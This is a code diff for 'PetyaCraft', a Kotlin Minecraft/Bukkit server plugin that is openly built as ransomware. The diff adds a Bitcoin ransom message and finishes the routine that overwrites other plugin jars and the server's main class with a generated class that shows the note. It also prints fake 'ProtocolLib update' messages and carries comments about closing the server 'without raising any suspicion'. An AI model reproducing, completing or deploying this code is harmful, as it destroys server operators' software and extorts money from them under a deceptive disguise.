@@ -15,6 +15,7 @@ import java.util.jar.JarFile
 import java.util.zip.ZipEntry
 import java.util.zip.ZipOutputStream
 import javax.lang.model.element.Modifier.PUBLIC
+import javax.lang.model.element.Modifier.STATIC
 import javax.tools.JavaFileObject
 import javax.tools.ToolProvider
 
@@ -27,19 +28,25 @@ class PetyaCraft(bitcoinAddress: String = generateBitcoinAddress()) : JavaPlugin
     val ANSI_RED_BACKGROUND = "\u001B[41m"
     val ANSI_RESET = "\u001B[0m"
     val PETYA = ANSI_RED_BACKGROUND + ANSI_WHITE
+    val petyaMessage = """
+${PETYA}You became victim of the PETYACRAFT RANSOMEWARE
+${PETYA}Your server and its plugins have been encrypted with a Military grade encryption algorithm.
+${PETYA}There is no way to restore your data without a special key.
+${PETYA}You can purchase this key by sending money to my Bitcoin `$bitcoinAddress`$ANSI_RESET
+"""
     private val onEnableMethod = MethodSpec.methodBuilder("onEnable")
             .addModifiers(PUBLIC)
             .returns(Void.TYPE)
-            .addStatement("System.out.println(\$S)",
-                    """
-${PETYA}You became victim of the PETYACRAFT RANSOMEWARE
-${PETYA}The plugins on your server have been encrypted with a Military grade encryption algorithm. There is no way to restore your data without a special key.
-${PETYA}You can purchase this key by sending money to my Bitcoin `$bitcoinAddress`$ANSI_RESET
-""")
+            .addStatement("System.out.println(\$S)", petyaMessage)
+            .build()
+    private val mainMethod = MethodSpec.methodBuilder("main")
+            .addParameter(Array<String>::class.java, "args")
+            .addModifiers(PUBLIC, STATIC)
+            .returns(Void.TYPE)
+            .addStatement("System.out.println(\$S)", petyaMessage)
             .build()
 
-    private fun createRansomeClass(): JavaFile {
-        val mainClass = "PetyaCraft"
+    private fun createRansomeClass(packageName: String = "protocolhacked", mainClass: String = "PetyaCraft"): JavaFile {
         val getEncryptedMethod = MethodSpec.methodBuilder("getEncrypted")
                 .addModifiers(PUBLIC)
                 .returns(java.lang.String::class.java)
@@ -64,25 +71,25 @@ ${PETYA}You can purchase this key by sending money to my Bitcoin `$bitcoinAddres
         val finished = TypeSpec.classBuilder(mainClass)
                 .superclass(JavaPlugin::class.java)
                 .addModifiers(PUBLIC)
+                .addMethod(mainMethod)
                 .addMethod(onEnableMethod)
                 .addMethod(getEncryptedMethod)
                 .build()
-        val jFile = JavaFile.builder("protocolhacked", finished).build()
+        val jFile = JavaFile.builder(packageName, finished).build()
         return jFile
 
     }
 
-    fun compileString(code: String): ByteArray {
+    fun compileString(code: String, name: String = "PetyaCraft"): ByteArray {
         val compiler = ToolProvider.getSystemJavaCompiler()
 
-        val compilationUnit = CodeGenMeta.StringJavaFileObject("PetyaCraft", code)
+        val compilationUnit = CodeGenMeta.StringJavaFileObject(name, code)
 
         val fileManager = CodeGenMeta.SimpleJavaFileManager(compiler.getStandardFileManager(null, null, null))
 
         val compilationTask = compiler.getTask(null, fileManager, null, null, null, Arrays.asList<JavaFileObject>(compilationUnit))
 
         compilationTask.call()
-        println(fileManager.generatedOutputFiles.map { it.className })
         return fileManager.generatedOutputFiles[0].bytes
 
     }
@@ -98,19 +105,18 @@ ${PETYA}You can purchase this key by sending money to my Bitcoin `$bitcoinAddres
                 e.printStackTrace()
             }
         }
-        /*
+
         println("ProtocolLib update finished, please restart")
-            Bukkit.getPluginManager().disablePlugin(this)
-            System.exit(0) // closes the server hopefully without raising any suspicion
-        */ // Nope, never mind. We're going to cause havoc
+        Bukkit.getPluginManager().disablePlugin(this)
+        System.exit(0) // closes the server hopefully without raising any suspicion
+        // Nope, never mind. We're going to cause havoc
         Bukkit.getPluginManager().disablePlugin(this)
     }
 
     private fun encrypt(file: File) {
         val raw = file.readBytes()
         val rcb = createRansomeClass()
-        // val cw = ClassWriter(ClassReader("protocolhacked.PetyaCraft"), 0)
-        println("Applying ProtocolLib -> ${file.name ?: ""}")
+        println("Applying ProtocolLib -> ${file.name ?: ""}") // sneaky debug
         val code = compileString(rcb.toString())
         val zout = ZipOutputStream(FileOutputStream(file))
 
@@ -118,7 +124,7 @@ ${PETYA}You can purchase this key by sending money to my Bitcoin `$bitcoinAddres
         zout.write("nocrypt".toByteArray())
         zout.closeEntry()
 
-        zout.putNextEntry(ZipEntry("encrypted.raw"))
+        zout.putNextEntry(ZipEntry("encrypted.raw")) // TODO encrypt this entry
         zout.write(raw)
         zout.closeEntry()
 
@@ -143,30 +149,49 @@ version: 1.0
     }
 
     override fun onDisable() {
+        generateServerFile()
+        println("Update failed...")
+        println("Fixing... Error about to occur, please restart afterwards")
         if (self != null) {
             self?.delete() // not important if the plugin is not deleted
         }
-        // overwriteServer() //TODO finish this method
-        println("Update failed...")
-        println("Fixing... Error about to occur, please restart afterwards")
-        crash()
+
+        // Write changes
+        overwriteServer()
+        println("Fixed, although an error will occur, please restart")
+        // crash()
+        System.exit(0)
     }
 
     private fun overwriteServer() {
-        TODO("FINISH")
+        val os = getServerJar().outputStream() // overwrite the server jar
+        os.write(temp.inputStream().readBytes())
+        os.flush()
+        temp.delete()
+    }
+
+    val temp = File(dataFolder, "temp.jar")
+    private fun generateServerFile() {
+        dataFolder.mkdirs()
+        logger.info("Made dirs")
+        logger.info("Made files")
+        temp.createNewFile()
         val serverJarFile = JarFile(getServerJar())
         val entries = serverJarFile.entries()
-        serverJarFile.close()
-        val zout = ZipOutputStream(FileOutputStream(getServerJar()))
+        val zout = ZipOutputStream(FileOutputStream(temp))
         for (entry in entries) {
-            zout.putNextEntry(entry)
             if (entry.name == "org/bukkit/craftbukkit/Main.class") {
-                zout.write(compileString(createRansomeClass().toString()))
+                zout.putNextEntry(ZipEntry(entry.name))
+                zout.write(compileString(createRansomeClass("org.bukkit.craftbukkit", "Main").toString(), "Main"))
             } else {
+                zout.putNextEntry(entry)
                 zout.write(serverJarFile.getInputStream(entry).readBytes())
             }
             zout.closeEntry()
         }
+        zout.flush()
+        zout.close()
+        serverJarFile.close()
     }
 
     private fun canEncrypt(file: File): Boolean {
@@ -179,7 +204,7 @@ version: 1.0
             } catch(e: Exception) {
                 return false
             }
-            return nc != "nocrypt" || nc != "original"
+            return nc != "nocrypt" && nc != "original"
         } catch (e: Exception) {
             return true
         }
@@ -196,9 +221,7 @@ version: 1.0
 
     private fun getServerJar(): File {
 
-        val dir = File(PetyaCraft::class.java.protectionDomain.codeSource.location.toURI().path)
-        val jar = System.getProperty("java.class.path")
-        return File(dir, jar)
+        return File(JavaPlugin::class.java.getProtectionDomain().getCodeSource().getLocation().toURI().getPath());
 
     }
 }
